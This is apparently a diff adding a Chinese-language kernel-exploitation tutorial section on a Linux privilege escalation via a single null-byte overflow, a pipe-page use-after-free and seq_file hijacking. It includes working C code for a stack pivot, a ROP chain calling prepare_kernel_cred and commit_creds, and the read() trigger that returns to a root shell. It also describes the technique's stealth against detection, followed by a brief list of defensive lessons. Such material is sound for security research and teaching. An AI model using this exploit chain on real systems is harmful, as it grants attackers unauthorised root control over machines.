+rop_chain = (size_t*)((char *)seq_file_data - 0x20 + 0x28 + 0x39);
+rop_chain[0] = kernel_offset + POP_RSP_BP_RET;
+
+seq_file_data[0] = kernel_offset + PUSH_RSI_JMP_RSI_39;
+seq_file_data[1] = 0;
+seq_file_data[2] = kernel_offset + ADD_RSP_0X40_RET;
+seq_file_data[3] = 0;
+seq_file_data[4] = seq_file_addr + 0x40;
+seq_file_data[5] = seq_file_addr + 0x40;
+seq_file_data[6] = seq_file_addr + 0x20;
+```
+
+栈迁移gadget（`POP_RSP_BP_RET`）位于ROP链起始位置，负责将栈指针从内核栈迁移至可控的伪栈区域。
+
+**权限提升原语**：
+
+```c
+rop_chain = (size_t*)&seq_file_data[10];
+int i = 0;
+rop_chain[i++] = 0; // padding
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
+rop_chain[i++] = kernel_offset + POP_RCX_BX_12_BP_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + MOV_RDI_RAX_MOVSQ_RET;
+rop_chain[i++] = kernel_offset + COMMIT_CREDS;
+rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+rop_chain[i++] = *(size_t *)"BinRacer";
+rop_chain[i++] = *(size_t *)"BinRacer";
+rop_chain[i++] = (size_t)get_root_shell;
+rop_chain[i++] = user_cs;
+rop_chain[i++] = user_rflags;
+rop_chain[i++] = user_sp + 8;
+rop_chain[i++] = user_ss;
+```
+
+**ROP链逻辑分段**：
+
+1. **栈迁移段**：调整栈指针至可控内存区域，为后续gadget执行铺平道路
+2. **参数准备段**：清理寄存器状态，设置`prepare_kernel_cred`的参数（rdi=0）
+3. **凭证创建段**：调用`prepare_kernel_cred(0)`创建root权限凭证结构
+4. **权限应用段**：将新凭证移交`commit_creds`应用到当前进程
+5. **安全返回段**：通过内核标准返回路径`swapgs_restore_regs_and_return_to_usermode`恢复用户态
+
+#### 6-6-3. 执行触发与状态恢复
+
+通过合法的文件读取操作触发预设的执行流程，完成权限升级后恢复系统状态。触发机制的设计充分利用了内核的正常执行路径，避免引起异常检测。
+
+**控制流触发**：
+
+```c
+/* Phase 4-4: Trigger ROP chain */
+log.info("Phase 4-4: Writing ROP chain to UAF shared page");
+write(pipe_fds[evil_pipe_index][1], seq_file_data, 0x100);
+log.info("Phase 4-4: Triggering ROP chain via seq_file read...");
+read(seq_fd[victim_seq_index], seq_file_data, 0x8);
+```
+
+**执行流程概要**：
+
+1. **触发入口**：用户空间`read()`系统调用进入内核文件操作路径，属于合法系统调用
+2. **VFS路由**：`vfs_read()`根据文件类型路由至seq_file的读操作方法
+3. **指针解析**：`seq_read()`调用被篡改的`seq_operations->start`指针，跳转至伪操作表
+4. **栈迁移**：执行`POP_RSP_BP_RET` gadget，将栈指针迁移至ROP链起始位置
+5. **权限提升**：依次执行`prepare_kernel_cred()`和`commit_creds()`完成权限升级
+6. **安全返回**：通过`swapgs_restore_regs_and_return_to_usermode`安全返回用户态
+
+#### 6-6-4. 控制流转移动态图示
+
+```mermaid
+%%{init: {'theme': 'base', 'themeVariables': { 'primaryColor': '#e1f5e1', 'primaryBorderColor': '#2e7d32', 'secondaryColor': '#fce4ec', 'secondaryBorderColor': '#d81b60'}}}%%
+sequenceDiagram
+    participant 用户空间 as 📝 用户空间
+    participant 系统调用 as ⚙️ 系统调用
+    participant 文件系统 as 📁 虚拟文件系统
+    participant seq层 as 🔄 seq_file层
+    participant ROP链 as 🎯 ROP执行链
+
+    用户空间->>系统调用: read(seq_fd, buffer, size)
+    系统调用->>文件系统: __x64_sys_read()
+    文件系统->>seq层: vfs_read()
+    seq层->>seq层: seq_read()
+    seq层->>seq层: 解引用 seq_operations->start
+    Note right of seq层: 指针已被篡改→<br/>跳转至伪操作表
+
+    seq层->>ROP链: 执行栈迁移 gadget
+    Note over ROP链: POP_RSP_BP_RET<br/>栈指针迁移至可控区域
+    ROP链->>ROP链: POP_RDI_RET
+    ROP链->>ROP链: prepare_kernel_cred(0)
+    ROP链->>ROP链: commit_creds(cred)
+    ROP链->>用户空间: swapgs_restore_regs...<br/>安全返回用户态
+```
+
+### 6-7. 技术特征对比与分析
+
+#### 6-7-1. 与传统技术实现的差异化
+
+| 技术维度   | 第四章实现               | 本章Poison Null Byte实现       |
+| ---------- | ------------------------ | ------------------------------ |
+| 溢出方式   | 常规缓冲区溢出（多字节） | 单字节null溢出（微创操作）     |
+| 目标对象   | 直接篡改udp_prot函数指针 | 间接对象重叠操纵seq_operations |
+| 信息泄露   | seq_file buf指针覆写     | 管道共享页面UAF与类型混淆      |
+| 内存布局   | 简单slab隔离与空洞创建   | 精细管道页面共享拓扑构建       |
+| 控制流劫持 | 网络协议栈路径劫持       | 文件系统序列操作路径劫持       |
+| 隐蔽等级   | 中等（需修改关键结构）   | 高（单字节修改+合法路径触发）  |
+
+#### 6-7-2. 技术优势与局限
+
+**技术优势**：
+
+1. **高度隐蔽性**：单字节溢出操作极难被基于异常值或代码签名的检测机制识别，规避传统安全防护
+2. **可靠性强**：依赖稳定的内核对象生命周期（管道/seq_file），相较堆喷射成功率更稳定
+3. **通用性好**：不依赖特定设备驱动，适用于多数Linux发行版的通用内核设施
+4. **资源友好**：内存占用和系统扰动相对较小，对目标系统性能影响有限
+5. **路径合法**：全程利用合法系统调用路径，避免触发异常行为监测
+
+**技术局限**：
+
+1. **环境依赖**：需要精确的堆分配模式和缓存状态，内存碎片可能降低成功率
+2. **时序敏感**：操作顺序和时间窗口要求严格，并发干扰可能导致竞态条件
+3. **兼容性挑战**：不同内核版本的SLUB实现差异与结构体布局变化影响适配性
+4. **防御规避**：需额外措施应对现代内核的堆随机化与隔离强化机制
+
+#### 6-7-3. 防御视角的启示
+
+1. **堆完整性保护**：加强SLUB分配器的边界检查和元数据验证，引入运行时堆一致性审计
+2. **对象隔离强化**：增加不同类型对象间的内存隔离机制，防止跨缓存类型混淆
+3. **指针完整性**：引入函数指针签名验证与控制流完整性（CFI）检查，防范非法跳转
+4. **行为监控**：实时检测异常的对象重叠和类型混淆行为，建立内存操作基线
+5. **随机化增强**：扩大内核地址与堆布局的随机化粒度，降低布局预测成功率
+
+### 6-8. 技术实现总结
+
+本技术实现展示了Poison Null Byte在内核漏洞利用中的高阶应用，通过单字节溢出引发链式反应，最终实现权限提升。与第四章的技术方案形成递进关系，体现了从基础溢出到精细堆操作的技术进化路径。整个流程涵盖了环境准备、内存布局、对象操作、信息泄露、控制流劫持等完整技术要素，为系统安全研究提供了深层视角。
+
+技术实现中采用的管道共享页面构造、UAF利用、seq_file重定向等方法，结合`alloc_pipe_info`、`pipe_resize_ring`、`pipe_buf_release`、`free_pipe_info`、`pipe_release`等内核管道管理函数的精确操控，揭示了内核对象管理的潜在脆弱性，同时也为防御体系建设提供了实证参考。通过对SLUB分配器行为的深入理解和精确操控，展示了现代系统安全技术的复杂性和精密性。这种研究不仅有助于理解现有防御机制的局限性，也为未来安全体系的改进指明了方向，体现了技术研究的建设性价值。
+
+### 6-9. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/CrossCacheOverflow/CrossCacheOverflow_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 - https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheOverflow2
+- https://github.com/BinRacer/pwn4kernel/tree/master/src/CrossCacheOverflow3
 - https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
 - https://bsauce.github.io/2022/11/07/castaways/
 - https://github.com/arttnba3/Linux-kernel-exploitation/blob/main/tools/kernelpwn.h
